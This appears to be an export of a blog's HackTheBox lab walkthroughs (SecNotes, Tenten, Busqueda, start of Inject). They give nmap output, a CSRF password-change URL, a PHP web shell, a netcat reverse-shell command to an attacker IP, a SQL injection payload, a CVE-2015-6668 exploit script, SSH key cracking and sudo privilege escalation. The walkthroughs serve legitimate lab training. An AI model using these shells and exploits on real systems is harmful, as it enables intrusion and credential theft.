18:49 BST Nmap scan report for 10.10.10.97 (10.10.10.97) Host is up (0.092s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 445/tcp open microsoft-ds 8808/tcp open ssports-bcast └─$ nmap -Pn -p80,445,8808 -sC -sV 10.10.10.97 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 18:54 BST Nmap scan report for 10.10.10.97 (10.10.10.97) Host is up (0.13s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE | http-title: Secure Notes - Login |_Requested resource was login.php |_http-server-header: Microsoft-IIS/10.0 445/tcp open 10.10.100 Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) 8808/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 2h19m24s, deviation: 4h02m30s, median: -35s | smb-os-discovery: | OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: SECNOTES | NetBIOS computer name: SECNOTES\\x00 | Workgroup: HTB\\x00 |_ System time: 2023-09-02T10:53:49-07:00 | smb2-time: | date: 2023-09-02T17:53:53 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Web Server Port 8808 Foothold We can register a user We have change password option http://10.10.10.97/change_pass.php But it doesn\u0026rsquo;t require old password So after trying to figure out what to do, I got a hint from forum If we change request type to GET and visit http://10.10.10.97/change_pass.php?password=pentest3\u0026amp;confirm_password=pentest3\u0026amp;submit=submit, it works So it looks like we can CSRF the tyler user via contact us page CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf https://owasp.org/www-community/attacks/csrf Since the user doesn\u0026rsquo;t require to enter an old password, if we make user visit evil url we can make user do unintentional commands After waiting for several minutes we got access And we have notes with creds: tyler:92g!mA8BGjOirkL%OG*\u0026amp; Let\u0026rsquo;s test the creds └─$ crackmapexec smb 10.10.10.97 -u tyler -p \u0026#39;92g!mA8BGjOirkL%OG*\u0026amp;\u0026#39; SMB 10.10.10.97 445 SECNOTES [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True) SMB 10.10.10.97 445 SECNOTES [+] SECNOTES\\tyler:92g!mA8BGjOirkL%OG*\u0026amp; Let\u0026rsquo;s check the contents of smb shares └─$ smbclient -L //10.10.10.97/ -U tyler --password \u0026#39;92g!mA8BGjOirkL%OG*\u0026amp;\u0026#39; Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC new-site Disk └─$ smbclient //10.10.10.97/new-site -U tyler --password \u0026#39;92g!mA8BGjOirkL%OG*\u0026amp;\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Aug 19 19:06:14 2018 .. D 0 Sun Aug 19 19:06:14 2018 iisstart.htm A 696 Thu Jun 21 16:26:03 2018 iisstart.png A 98757 Thu Jun 21 16:26:03 2018 7736063 blocks of size 4096. 3388635 blocks available It looks like the website from port 8808 And it looks like we can upload files └─$ echo \u0026#34;test\u0026#34; \u0026gt; test.txt smb: \\\u0026gt; put test.txt putting file test.txt as \\test.txt (0.0 kb/s) (average 0.0 kb/s) └─$ curl http://10.10.10.97:8808/test.txt test Since we saw .php extension on port 80, the box and IIS probably supports php The web shell: \u0026lt;?php system($_REQUEST['cmd']); ?\u0026gt; smb: \\\u0026gt; put shell.php putting file shell.php as \\shell.php (0.1 kb/s) (average 0.1 kb/s) └─$ curl http://10.10.10.97:8808/shell.php?cmd=whoami secnotes\\tyler Let\u0026rsquo;s get reverse shell nc64.exe+-e+cmd.exe+10.10.16.5+6666 smb: \\\u0026gt; put nc64.exe putting file nc64.exe as \\nc64.exe (63.2 kb/s) (average 17.9 kb/s) smb: \\\u0026gt; put shell.php putting file shell.php as \\shell.php (0.1 kb/s) (average 16.5 kb/s) └─$ curl \u0026#39;http://10.10.10.97:8808/shell.php?cmd=powershell.exe%20iex%20%22shell.ps1%22\u0026#39; Second-Order SQLi By the way, there happened to unintentional path via Second-Order SQLi Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. https://portswigger.net/kb/issues/00100210_sql-injection-second-order The payload used ' or 1='1 Root Enumerate Nothing is special with groups and privileges But we have a strange bash.lnk c:\\Users\\tyler\u0026gt;dir Desktop dir Desktop Volume in drive C has no label. Volume Serial Number is 1E7B-9B76 Directory of c:\\Users\\tyler\\Desktop 08/19/2018 03:51 PM \u0026lt;DIR\u0026gt; . 08/19/2018 03:51 PM \u0026lt;DIR\u0026gt; .. 06/22/2018 03:09 AM 1,293 bash.lnk 08/02/2021 03:32 AM 1,210 Command Prompt.lnk 04/11/2018 04:34 PM 407 File Explorer.lnk 06/21/2018 05:50 PM 1,417 Microsoft Edge.lnk 06/21/2018 09:17 AM 1,110 Notepad++.lnk 09/02/2023 10:48 AM 34 user.txt 08/19/2018 10:59 AM 2,494 Windows PowerShell.lnk 7 File(s) 7,965 bytes 2 Dir(s) 13,878,030,336 bytes free c:\\Users\\tyler\u0026gt;type desktop\\bash.lnk type desktop\\bash.lnk L�F w������V� �v(��� ��9P�O� �:i�+00�/C:\\V1�LIWindows@ ﾋL���LI.h���\u0026amp;WindowsZ1�L\u0026lt;System32B ﾋL���L\u0026lt;.p�k�System32▒Z2��LP� bash.exeB ﾋL\u0026lt;��LU.�Y����bash.exe▒K-JںݜC:\\Windows\\System32\\bash.exe\u0026#34;..\\..\\..\\Windows\\System32\\bash.exeC:\\Windows\\System32�%� �wN�▒�]N�D.��Q���`�Xsecnotesx�\u0026lt;sAA��㍧�o�:u��\u0026#39;�/�x�\u0026lt;sAA��㍧�o�:u��\u0026#39;�/�= �Y1SPS�0��C�G����sf\u0026#34;=dSystem32 (C:\\Windows)�1SPS��XF�L8C���\u0026amp;�m�q/S-1-5-21-1791094074-1363918840-4199337083-1002�1SPS0�%��G▒��`����% bash.exe@������ �) Application@v(��� �i1SPS�jc(=�����O�▒�MC:\\Windows\\System32\\bash.exe91SPS�mD��pH�H@.�=x�hH�(�bP Let\u0026rsquo;s run C:\\Windows\\System32\\bash.exe Let\u0026rsquo;s check .bash_history And we find creds: Administrator:u6!4ZwgwOM#^OBf#Nwnh psexec as Administrator Rooted ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/secnotes/images/secnotes.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/secnotes/","summary":"SecNotes Enumeration nmap └─$ nmap -Pn -p- 10.10.10.97 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 18:49 BST Nmap scan report for 10.10.10.97 (10.10.10.97) Host is up (0.092s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 445/tcp open microsoft-ds 8808/tcp open ssports-bcast └─$ nmap -Pn -p80,445,8808 -sC -sV 10.10.10.97 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 18:54 BST Nmap scan report for 10.","tags":["HTB","csrf","second-order-sqli","smb","wsl","bash.exe","smbclient","webshell","psexec","sqli"],"title":"[HTB] Machine: SecNotes"},{"categories":null,"contents":"Tenten Enumeration nmap └─$ nmap -Pn -p- 10.10.10.10 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 17:38 BST Nmap scan report for 10.10.10.10 (10.10.10.10) Host is up (0.094s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.10 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 17:54 BST Nmap scan report for 10.10.10.10 (10.10.10.10) Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA) | 256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA) |_ 256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Did not follow redirect to http://tenten.htb/ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Web Server wpscan └─$ wpscan --url http://tenten.htb _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://tenten.htb/ [10.10.10.10] [+] Started: Sat Sep 2 11:01:54 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://tenten.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://tenten.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://tenten.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06). | Found By: Rss Generator (Passive Detection) | - http://tenten.htb/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.7.3\u0026lt;/generator\u0026gt; | - http://tenten.htb/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.7.3\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://tenten.htb/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://tenten.htb/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) | - http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: \u0026#39;Version: 1.1\u0026#39; [+] Enumerating All Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] job-manager | Location: http://tenten.htb/wp-content/plugins/job-manager/ | Latest Version: 0.7.25 (up to date) | Last Updated: 2015-08-25T22:44:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 7.2.5 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://tenten.htb/wp-content/plugins/job-manager/readme.txt [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:06 \u0026lt;=============================================================================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:06 [i] No Config Backups Found. [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Sep 2 11:02:08 2023 [+] Requests Done: 173 [+] Cached Requests: 5 [+] Data Sent: 41.965 KB [+] Data Received: 392.056 KB [+] Memory used: 240.5 MB [+] Elapsed time: 00:00:14 Foothold Gooling shows CVE-2015-6668 It looks like an IDOR vulnerability We can visit http://tenten.htb/index.php/jobs/apply/\u0026lt;id\u0026gt;/ By changing id we can leak post titles in the database └─$ curl -s http://tenten.htb/index.php/jobs/apply/8/ | grep title \u0026lt;title\u0026gt;Job Application: Pen Tester \u0026amp;#8211; Job Portal\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;alternate\u0026#34; type=\u0026#34;application/rss+xml\u0026#34; title=\u0026#34;Job Portal \u0026amp;raquo; Feed\u0026#34; href=\u0026#34;http://tenten.htb/index.php/feed/\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;alternate\u0026#34; type=\u0026#34;application/rss+xml\u0026#34; title=\u0026#34;Job Portal \u0026amp;raquo; Comments Feed\u0026#34; href=\u0026#34;http://tenten.htb/index.php/comments/feed/\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;EditURI\u0026#34; type=\u0026#34;application/rsd+xml\u0026#34; title=\u0026#34;RSD\u0026#34; href=\u0026#34;http://tenten.htb/xmlrpc.php?rsd\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;alternate\u0026#34; type=\u0026#34;application/rss+xml\u0026#34; href=\u0026#34;http://tenten.htb/index.php/jobs/feed/\u0026#34; title=\u0026#34;Latest Jobs\u0026#34; /\u0026gt; jobman_selected_jobs_names.push( jQuery(this).attr( \u0026#39;title\u0026#39; ) ); jobman_selected_cats_names.push( jQuery(this).attr( \u0026#39;title\u0026#39; ) ); \u0026lt;p class=\u0026#34;site-title\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;http://tenten.htb/\u0026#34; rel=\u0026#34;home\u0026#34;\u0026gt;Job Portal\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;h1 class=\u0026#34;entry-title\u0026#34;\u0026gt;Job Application: Pen Tester\u0026lt;/h1\u0026gt; \u0026lt;/header\u0026gt;\u0026lt;!-- .entry-header --\u0026gt; └─$ curl -s http://tenten.htb/index.php/jobs/apply/8/ | grep \u0026#34;entry-title\u0026#34; | cut -d\u0026#39;\u0026gt;\u0026#39; -f2 | cut -d\u0026#39;\u0026lt;\u0026#39; -f1 Job Application: Pen Tester Let\u0026rsquo;s loop through └─$ for i in {1..30}; do (echo -n \u0026#34;$i: \u0026#34; \u0026amp;\u0026amp; curl -s http://tenten.htb/index.php/jobs/apply/$i/ | grep \u0026#34;entry-title\u0026#34; | cut -d\u0026#39;\u0026gt;\u0026#39; -f2 | cut -d\u0026#39;\u0026lt;\u0026#39; -f1); done 1: Job Application: Hello world! 2: Job Application: Sample Page 3: Job Application: Auto Draft 4: Job Application 5: Job Application: Jobs Listing 6: Job Application: Job Application 7: Job Application: Register 8: Job Application: Pen Tester 9: Job Application: 10: Job Application: Application 11: Job Application: cube 12: Job Application: Application 13: Job Application: HackerAccessGranted 14: Job Application 15: Job Application 16: Job Application 17: Job Application 18: Job Application 19: Job Application 20: Job Application 21: Job Application 22: Job Application 23: Job Application 24: Job Application 25: Job Application 26: Job Application 27: Job Application 28: Job Application 29: Job Application 30: Job Application Using the script below, we can find associated resume uploads import requests print \u0026#34;\u0026#34;\u0026#34; CVE-2015-6668 Title: CV filename disclosure on Job-Manager WP Plugin Author: Evangelos Mourikis Blog: https://vagmour.eu Plugin URL: http://www.wp-jobmanager.com Versions: \u0026lt;=0.7.25 \u0026#34;\u0026#34;\u0026#34; website = raw_input(\u0026#39;Enter a vulnerable website: \u0026#39;) filename = raw_input(\u0026#39;Enter a file name: \u0026#39;) filename2 = filename.replace(\u0026#34; \u0026#34;, \u0026#34;-\u0026#34;) for year in range(2013,2018): for i in range(1,13): for extension in {\u0026#39;doc\u0026#39;,\u0026#39;pdf\u0026#39;,\u0026#39;docx\u0026#39;}: URL = website + \u0026#34;/wp-content/uploads/\u0026#34; + str(year) + \u0026#34;/\u0026#34; + \u0026#34;{:02}\u0026#34;.format(i) + \u0026#34;/\u0026#34; + filename2 + \u0026#34;.\u0026#34; + extension req = requests.get(URL) if req.status_code==200: print \u0026#34;[+] URL of CV found! \u0026#34; + URL Let\u0026rsquo;s try it I went through all possible job applications, increased year range and also added jpg extension └─$ python2.7 cve-2015-6668.py CVE-2015-6668 Title: CV filename disclosure on Job-Manager WP Plugin Author: Evangelos Mourikis Blog: https://vagmour.eu Plugin URL: http://www.wp-jobmanager.com Versions: \u0026lt;=0.7.25 Enter a vulnerable website: http://tenten.htb/ Enter a file name: HackerAccessGranted [+] URL of CV found! http://tenten.htb//wp-content/uploads/2017/04/HackerAccessGranted.jpg Image http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg So it looks like it could be stenography └─$ steghide extract -sf HackerAccessGranted.jpg Enter passphrase: the file \u0026#34;id_rsa\u0026#34; does already exist. overwrite ? (y/n) y wrote extracted data to \u0026#34;id_rsa\u0026#34;. The key is encrypted └─$ cat id_rsa -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C /HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo 1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g 2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo 6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9 4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF 2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7 L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv 5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB 9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP -----END RSA PRIVATE KEY----- Let\u0026rsquo;s use john └─$ ssh2john id_rsa \u0026gt; id_rsa.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status superpassword (id_rsa) 1g 0:00:00:00 DONE (2023-09-02 11:43) 3.333g/s 2600Kp/s 2600Kc/s 2600KC/s superpene..supermoy Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. We can try a username takis from website Root sudo -l takis@tenten:~$ sudo -l Matching Defaults entries for takis on tenten: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User takis may run the following commands on tenten: (ALL : ALL) ALL (ALL) NOPASSWD: /bin/fuckin If we had password we could run everything, but without it we can only run /bin/fuckin takis@tenten:~$ file /bin/fuckin /bin/fuckin: Bourne-Again shell script, ASCII text executable takis@tenten:~$ cat /bin/fuckin #!/bin/bash $1 $2 $3 $4 It just passes 4 arguments Let\u0026rsquo;s try id takis@tenten:~$ sudo /bin/fuckin id uid=0(root) gid=0(root) groups=0(root) We can read flag takis@tenten:~$ sudo /bin/fuckin cat /root/root.txt 3965120f71fefbc75e************** ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/tenten/images/tenten.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/tenten/","summary":"Tenten Enumeration nmap └─$ nmap -Pn -p- 10.10.10.10 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 17:38 BST Nmap scan report for 10.10.10.10 (10.10.10.10) Host is up (0.094s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.10 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 17:54 BST Nmap scan report for 10.10.10.10 (10.10.10.10) Host is up (0.","tags":["HTB","wordpress","wpscan","wp-job-manager","cve-2015-6668","python","steganography","steghide","ssh","john","sudo","mysql"],"title":"[HTB] Machine: Tenten"},{"categories":null,"contents":"Busqueda Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p- 10.10.11.208 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 05:39 EDT Nmap scan report for 10.10.11.208 (10.10.11.208) Host is up (0.13s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 645.26 seconds ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p22,80 -sC -sV 10.10.11.208 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 05:50 EDT Nmap scan report for 10.10.11.208 (10.10.11.208) Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://searcher.htb/ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds Web Server gobuster └─$ gobuster dir -u http://searcher.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://searcher.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/20 07:56:32 Starting gobuster in directory enumeration mode =============================================================== /search (Status: 405) [Size: 153] /server-status (Status: 403) [Size: 277] Progress: 20721 / 26585 (77.94%)[ERROR] 2023/05/20 08:01:21 [!] parse \u0026#34;http://searcher.htb/error\\x1f_log\u0026#34;: net/url: invalid control character in URL Progress: 26584 / 26585 (100.00%) =============================================================== 2023/05/20 08:02:43 Finished =============================================================== Foothold/User We know that it\u0026rsquo;s a flask app that uses searchor 2.4.0 library Post descrinbing possible vulnerabilities Pull Request for rce fix Let\u0026rsquo;s test it Since we saw eval function is used without any sanitazation, we can craft own payload PoC if needed And it looks like it works Let\u0026rsquo;s get a reverse shell And we have our foothold Root We see some creds in /var/www/app directory cody:jh1usoih2bkjaspwe92 Moreover we also have additional vhost gitea.searcher.htb If we try cody\u0026rsquo;s password for svc it works, now we can check sudo rights We can execute /opt/scripts/system-checkup.py * as root But permissions to that script indicate that I can\u0026rsquo;t read it Let\u0026rsquo;s also open gitea and check it\u0026rsquo;s content Nothing Let\u0026rsquo;s try executing /opt/scripts/system-checkup.py We see a help menu We can list and inspect docker containers running Let\u0026rsquo;s inspect containers And we see creds `` root:jI86kGUuj87guWr3RyF gitea:yuiu1hoiu4i5ho1uh We can try using creds for gitea admin:yuiu1hoiu4i5ho1uh works Now we can access scripts repo Analyze the scripts We have an interesting option in system-checkup.py, where it uses full-checkup.sh script The content of full-checkup.sh But the file full-checkup.sh doesn\u0026rsquo;t exist So we can create our own script anywhere (since the system-checkup.py doesn\u0026rsquo;t use full path) I created reverse shell script and ran sudo python3 /opt/scripts/system-checkup.py full-checkup And we\u0026rsquo;re root ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/busqueda/images/busqueda.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/busqueda/","summary":"Busqueda Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p- 10.10.11.208 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 05:39 EDT Nmap scan report for 10.10.11.208 (10.10.11.208) Host is up (0.13s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 645.26 seconds ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p22,80 -sC -sV 10.10.11.208 -T4 Starting Nmap 7.","tags":["HTB","flask","searchor","python-eval","command-injection","password-reuse","gitea"],"title":"[HTB] Machine: Busqueda"},{"categories":null,"contents":"Inject Enumeration nmap ┌──(kali㉿kali)-[~/Documents/tasks] └─$ nmap -Pn -p- -T4 10.10.11.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 14:17 EDT Nmap scan report for 10.10.11.204 (10.10.11.204) Host is up (0.16s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5427/tcp filtered sco-peer-tta 8080/tcp open http-proxy 62318/tcp filtered unknown ┌──(kali㉿kali)-[~/Documents/tasks] └─$ nmap -sC -sV -p22,5427,8080,62318 10.10.11.204 -Pn -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 14:27 EDT Nmap scan report for 10.10.11.204 (10.10.11.204) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA) | 256 d51c81c97b076b1cc1b429254b52219f (ECDSA) |_ 256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519) 5427/tcp closed sco-peer-tta 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home 62318/tcp closed unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds Web Server gobuster ┌──(kali㉿kali)-[~/Documents/tasks] └─$ gobuster dir -u http://10.10.11.204:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.204:8080/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 